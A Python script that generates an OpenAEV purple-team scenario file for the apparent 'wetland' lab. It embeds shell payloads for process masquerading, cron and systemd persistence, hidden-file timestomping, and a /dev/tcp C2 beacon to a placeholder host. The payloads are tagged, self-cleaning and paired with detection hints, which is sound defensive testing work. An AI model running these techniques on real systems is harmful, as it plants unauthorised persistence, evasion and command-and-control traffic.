import json, uuid, copy

NS = uuid.UUID("6f1a0b2c-wetland-0000-0000-000000000000".replace("wetland","a1b2c3d4")[:36])
def U(k): return str(uuid.uuid5(NS, "wetland-openaev:"+k))

easm = json.load(open("easm.json"))
lin  = json.load(open("linux-scn.json"))

# real openaev_implant Command contract template (from the Linux scenario step)
tmpl_ic = copy.deepcopy(lin["scenario_workflow"]["workflow_steps"][0]["step_data"]["inject_injector_contract"])
tmpl_payload = copy.deepcopy(lin["scenario_workflow"]["workflow_steps"][1]["step_data"]["inject_injector_contract"]["injector_contract_payload"])
ENDPOINT_DOMAIN = tmpl_ic["convertedContent"]["domains"]            # stable Endpoint domain obj
ENDPOINT_DOMAIN_IDS = tmpl_ic["injector_contract_domains"]

def ap(ext, name, desc):
    return {"attack_pattern_description": desc,
            "attack_pattern_external_id": ext,
            "attack_pattern_id": U("ap:"+ext),
            "attack_pattern_kill_chain_phases": [],
            "attack_pattern_name": name}

def payload(key, name, desc, executor, content, cleanup_exec, cleanup, aps,
            expectations=("DETECTION","PREVENTION"), elevation=False):
    p = copy.deepcopy(tmpl_payload)
    p["command_executor"] = executor
    p["command_content"]  = content
    p["payload_cleanup_executor"] = cleanup_exec
    p["payload_cleanup_command"]  = cleanup
    p["payload_arguments"] = []
    p["payload_description"] = desc
    p["payload_detection_remediations"] = []
    p["payload_elevation_required"] = elevation
    p["payload_execution_arch"] = "ALL_ARCHITECTURES"
    p["payload_expectations"] = list(expectations)
    p["payload_expected_security_platforms"] = {
        "DETECTION": ["EDR","XDR","SIEM"], "PREVENTION": ["EDR","XDR"]}
    if expectations == ("DETECTION",):
        p["payload_expected_security_platforms"] = {"DETECTION": ["EDR","XDR","SIEM","NDR"]}
    p["payload_external_id"] = U("pext:"+key)
    p["payload_id"] = U("pid:"+key)
    p["payload_name"] = name
    p["payload_output_parsers"] = []
    p["payload_platforms"] = ["Linux"]
    p["payload_prerequisites"] = []
    p["payload_source"] = "MANUAL"
    p["payload_status"] = "VERIFIED"
    p["payload_type"] = "Command"
    return p

def contract(key, label, aps, p):
    ic = copy.deepcopy(tmpl_ic)
    cid = U("contract:"+key)
    cc = ic["convertedContent"]
    cc["contract_id"] = cid
    cc["label"] = {"en": label, "fr": label}
    cc["platforms"] = ["Linux"]
    cc["domains"] = ENDPOINT_DOMAIN
    cc["contract_attack_patterns_external_ids"] = [a["attack_pattern_external_id"] for a in aps]
    ic["convertedContent"] = cc
    ic["injector_contract_id"] = cid
    ic["injector_contract_external_id"] = None
    ic["injector_contract_injector_type"] = "openaev_implant"
    ic["injector_contract_labels"] = {"en": label, "fr": label}
    ic["injector_contract_platforms"] = ["Linux"]
    ic["injector_contract_arch"] = "ALL_ARCHITECTURES"
    ic["injector_contract_atomic_testing"] = True
    ic["injector_contract_manual"] = False
    ic["injector_contract_needs_executor"] = True
    ic["injector_contract_custom"] = False
    ic["injector_contract_import_available"] = False
    ic["injector_contract_attack_patterns"] = aps
    ic["injector_contract_payload"] = p
    ic["injector_contract_payload_status"] = "VERIFIED"
    ic["injector_contract_tags"] = []
    ic["injector_contract_vulnerabilities"] = []
    ic["injector_contract_domains"] = ENDPOINT_DOMAIN_IDS
    ic["injector_contract_providing"] = ["text"]
    ic["injector_contract_content"] = json.dumps(cc, separators=(",",":"))
    return ic

def inject(key, title, desc, label, aps, p, delay):
    ic = contract(key, label, aps, p)
    return {"inject_all_teams": False, "inject_city": None,
            "inject_content": {"obfuscator": "plain-text"},
            "inject_country": None, "inject_depends_duration": delay,
            "inject_depends_on": [], "inject_description": desc,
            "inject_documents": [], "inject_enabled": True, "inject_id": None,
            "inject_injector_contract": ic, "inject_tags": [], "inject_teams": [],
            "inject_title": title}

# ---------------- techniques (mirror `wld lab`) ----------------
injects = []

# 1. masquerade  T1036.004/.005
injects.append(inject("masquerade",
 "Masquerade — process named as a kernel thread (T1036)",
 "Purple-team sim of `wld -l -M '[kworker/0:0]'` / `wld lab masquerade`. Launches a "
 "real process whose argv[0] is faked to look like a kernel worker thread, holds it "
 "~30s, then cleans up. WETLAND-LAB tagged. Detection: a process whose comm looks like "
 "a kernel thread but has a real /proc/<pid>/exe.",
 "Process Discovery → Masquerade [kworker]",
 [ap("T1036.005","Match Legitimate Name or Location","An adversary may match the name or location of a legitimate file or process to evade defenses."),
  ap("T1036.004","Masquerade Task or Service","Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign.")],
 payload("masquerade","wetland masquerade (kworker)",
   "Fake a process name to a kernel-thread style string via exec -a.","bash",
   "# WETLAND-LAB  T1036.005 masquerade (process name)\n"
   "drop=/tmp/.wetland-lab-kworker\n"
   "cp \"$(command -v sleep)\" \"$drop\" && chmod +x \"$drop\"\n"
   "( exec -a '[kworker/0:0]' \"$drop\" 30 ) >/dev/null 2>&1 </dev/null &\n"
   "echo \"WETLAND-LAB masquerade: pid $! runs $drop presenting as [kworker/0:0] for 30s\"\n"
   "echo \"detect: comm looks like a kthread but /proc/<pid>/exe resolves to $drop\"\n",
   "bash",
   "pkill -f '^\\[kworker/0:0\\]' 2>/dev/null || true\n"
   "rm -f /tmp/.wetland-lab-kworker\n"
   "echo 'WETLAND-LAB masquerade: cleaned'\n",
   [ap("T1036.005","Match Legitimate Name or Location",""),ap("T1036.004","Masquerade Task or Service","")]),
 0))

# 2. persist cron  T1053.003
injects.append(inject("persist_cron",
 "Persistence — @reboot cron entry (T1053.003)",
 "Mirrors `wld lab persist --method cron`. Installs a @reboot crontab line tagged "
 "WETLAND-LAB (harmless heartbeat), then removes it on cleanup. Detection: "
 "`crontab -l | grep WETLAND-LAB`; auditd on crontab spool.",
 "Persistence → cron @reboot",
 [ap("T1053.003","Cron","Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code.")],
 payload("persist_cron","wetland persist (cron)",
   "Add a @reboot cron line (harmless heartbeat), tagged WETLAND-LAB.","sh",
   "# WETLAND-LAB  T1053.003 cron persistence\n"
   "line='@reboot /bin/sh -c \"echo WETLAND-LAB heartbeat >> $HOME/.wetland-lab.log\" # WETLAND-LAB'\n"
   "( crontab -l 2>/dev/null | grep -v 'WETLAND-LAB'; echo \"$line\" ) | crontab - \\\n"
   "  && echo 'WETLAND-LAB persist[cron]: installed @reboot heartbeat' \\\n"
   "  || echo 'WETLAND-LAB persist[cron]: no cron spool/daemon (line still intended)'\n"
   "echo 'detect: crontab -l | grep WETLAND-LAB'\n",
   "sh",
   "crontab -l 2>/dev/null | grep -v 'WETLAND-LAB' | crontab - 2>/dev/null || true\n"
   "echo 'WETLAND-LAB persist[cron]: cleaned'\n",
   [ap("T1053.003","Cron","")]),
 60))

# 3. persist systemd user service  T1543.002
injects.append(inject("persist_systemd",
 "Persistence — systemd --user service (T1543.002)",
 "Mirrors `wld lab persist --method systemd`. Writes and enables a systemd --user unit "
 "tagged WETLAND-LAB; best-effort if there is no user systemd session. Cleanup disables "
 "and removes it. Detection: `systemctl --user list-unit-files | grep wetland-lab`.",
 "Persistence → systemd --user unit",
 [ap("T1543.002","Systemd Service","Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence.")],
 payload("persist_systemd","wetland persist (systemd)",
   "Write + enable a systemd --user unit (harmless heartbeat), tagged WETLAND-LAB.","bash",
   "# WETLAND-LAB  T1543.002 systemd --user persistence\n"
   "d=\"$HOME/.config/systemd/user\"; mkdir -p \"$d\"\n"
   "cat > \"$d/wetland-lab.service\" <<'UNIT'\n"
   "[Unit]\n"
   "Description=WETLAND-LAB purple-team persistence simulation (T1543.002)\n"
   "[Service]\n"
   "Type=oneshot\n"
   "ExecStart=/bin/sh -c 'echo WETLAND-LAB heartbeat >> %h/.wetland-lab.log'\n"
   "[Install]\n"
   "WantedBy=default.target\n"
   "UNIT\n"
   "if systemctl --user daemon-reload 2>/dev/null && systemctl --user enable wetland-lab.service 2>/dev/null; then\n"
   "  echo 'WETLAND-LAB persist[systemd]: unit enabled'\n"
   "else\n"
   "  echo \"WETLAND-LAB persist[systemd]: unit written at $d/wetland-lab.service (no user systemd session to enable)\"\n"
   "fi\n",
   "bash",
   "systemctl --user disable wetland-lab.service 2>/dev/null || true\n"
   "rm -f \"$HOME/.config/systemd/user/wetland-lab.service\"\n"
   "systemctl --user daemon-reload 2>/dev/null || true\n"
   "echo 'WETLAND-LAB persist[systemd]: cleaned'\n",
   [ap("T1543.002","Systemd Service","")]),
 120))

# 4. hide + timestomp  T1564.001 / T1070.006
injects.append(inject("hide",
 "Defense Evasion — hidden file + timestomp (T1564.001 / T1070.006)",
 "Mirrors `wld lab hide`. Drops an executable dot-file in $HOME and copies mtime/atime "
 "from a system binary (ctime cannot be faked). Cleanup removes it. Detection: "
 "`find ~ -maxdepth 1 -name '.*' -type f -perm -u+x`; ctime >> mtime.",
 "Defense Evasion → hidden dot-file + timestomp",
 [ap("T1564.001","Hidden Files and Directories","Adversaries may set files and directories to be hidden to evade detection mechanisms."),
  ap("T1070.006","Timestomp","Adversaries may modify file time attributes to hide new or changes to existing files.")],
 payload("hide","wetland hide + timestomp",
   "Drop an executable dot-file and timestomp it from a system binary.","bash",
   "# WETLAND-LAB  T1564.001 hidden file + T1070.006 timestomp\n"
   "dst=\"$HOME/.wetland-lab\"\n"
   "cp \"$(command -v ls)\" \"$dst\" && chmod +x \"$dst\"\n"
   "touch -r /bin/ls \"$dst\"\n"
   "echo \"WETLAND-LAB hide: dropped $dst, timestomped mtime/atime from /bin/ls\"\n"
   "echo \"detect: find ~ -maxdepth 1 -name '.*' -type f -perm -u+x ; ctime >> mtime\"\n",
   "bash",
   "rm -f \"$HOME/.wetland-lab\"\n"
   "echo 'WETLAND-LAB hide: cleaned'\n",
   [ap("T1564.001","Hidden Files and Directories",""),ap("T1070.006","Timestomp","")]),
 180))

# 5. beacon  T1071.001 / T1571
injects.append(inject("beacon",
 "Command & Control — HTTP-shaped C2 beacon (T1071.001 / T1571)",
 "Mirrors `wld lab beacon --as http`. Five jittered outbound check-ins shaped as HTTP "
 "GET with a fixed browser User-Agent. EDIT the C2= line to your wetland relay/tunnel "
 "host:port. Detection: beaconing regularity, fixed UA, low bytes-up/down ratio.",
 "Command & Control → HTTP-shaped beacon",
 [ap("T1071.001","Web Protocols","Adversaries may communicate using application layer protocols associated with web traffic to avoid detection."),
  ap("T1571","Non-Standard Port","Adversaries may communicate using a protocol and port pairing that are typically not associated.")],
 payload("beacon","wetland C2 beacon (http-shaped)",
   "Five jittered HTTP-shaped C2 check-ins to a host:port (edit C2=).","bash",
   "# WETLAND-LAB  T1071.001 / T1571 C2 beacon (http-shaped)\n"
   "C2='example.com:443'   # <-- EDIT: your wetland relay/tunnel host:port\n"
   "host=\"${C2%%:*}\"; port=\"${C2##*:}\"; [ \"$host\" = \"$port\" ] && port=443\n"
   "i=1\n"
   "while [ $i -le 5 ]; do\n"
   "  if exec 3<>\"/dev/tcp/$host/$port\" 2>/dev/null; then\n"
   "    printf 'GET /%08x HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\\r\\nAccept: */*\\r\\n\\r\\n' \"$RANDOM\" \"$host\" >&3\n"
   "    head -c 64 <&3 >/dev/null 2>&1; exec 3>&- 2>/dev/null\n"
   "    echo \"WETLAND-LAB beacon #$i: check-in to $host:$port (http-shaped)\"\n"
   "  else\n"
   "    echo \"WETLAND-LAB beacon #$i: $host:$port unreachable\"\n"
   "  fi\n"
   "  i=$((i+1)); sleep $(( (RANDOM % 7) + 3 ))\n"
   "done\n"
   "echo 'detect: periodic outbound to one host; fixed UA; low bytes-up/down (NetFlow/Zeek)'\n",
   None, None,
   [ap("T1071.001","Web Protocols",""),ap("T1571","Non-Standard Port","")],
   expectations=("DETECTION",)),
 240))

# ---------------- scenario envelope ----------------
out = copy.deepcopy(easm)
si = copy.deepcopy(easm["scenario_information"])
si["scenario_id"] = U("scenario")
si["scenario_name"] = "wetland — purple-team C2 lab (evasion → persistence → C2)"
si["scenario_subtitle"] = ""
si["scenario_description"] = (
 "Purple-team breach-and-attack-simulation of the wetland lab TTPs "
 "(https://github.com/s4nntysec/wetland). Each inject reproduces one `wld lab` technique "
 "as a portable, self-cleaning shell payload (no wld binary required on the agent), tagged "
 "WETLAND-LAB and mapped to ATT&CK: process masquerade (T1036), cron + systemd persistence "
 "(T1053.003 / T1543.002), hidden file + timestomp (T1564.001 / T1070.006) and an "
 "HTTP-shaped C2 beacon (T1071.001 / T1571). All techniques are intentionally loud and "
 "reversible — the point is to generate detectable telemetry, not stealth. Target your Linux "
 "assets, run, then review prevention/detection results. Edit the beacon's C2= line to point "
 "at your wetland relay/tunnel.")
si["scenario_category"] = "attack-scenario"
si["scenario_main_focus"] = "endpoint-protection"
si["scenario_severity"] = "high"
si["scenario_default_kill_chain"] = None
si["scenario_dependencies"] = []
si["scenario_documents"] = []
si["scenario_tags"] = []
si["scenario_lessons_anonymized"] = False
si["scenario_lessons_enabled"] = False

out["scenario_information"] = si
out["scenario_injects"] = injects
out["scenario_tags"] = []
for k in ("scenario_articles","scenario_challenges","scenario_channels",
          "scenario_documents","scenario_teams","scenario_users","scenario_variables",
          "scenario_organizations"):
    if k in out: out[k] = []
out["export_version"] = 1

path = "/home/ssantiagocv/wetland/sim/wetland-purple-c2.openaev.json"
import os; os.makedirs(os.path.dirname(path), exist_ok=True)
json.dump(out, open(path,"w"), indent=1, ensure_ascii=False)
print("wrote", path, os.path.getsize(path), "bytes")

# sanity
r = json.load(open(path))
print("export_version:", r["export_version"])
print("injects:", len(r["scenario_injects"]))
for j in r["scenario_injects"]:
    ic = j["inject_injector_contract"]
    assert "WETLAND-LAB" in ic["injector_contract_payload"]["command_content"]
    assert ic["injector_contract_id"] == ic["convertedContent"]["contract_id"]
    assert json.loads(ic["injector_contract_content"])["contract_id"] == ic["injector_contract_id"]
    print(" -", j["inject_title"], "|", ic["injector_contract_payload"]["command_executor"],
          "| APs:", ic["convertedContent"]["contract_attack_patterns_external_ids"],
          "| cleanup:", bool(ic["injector_contract_payload"]["payload_cleanup_command"]))
print("all assertions passed")
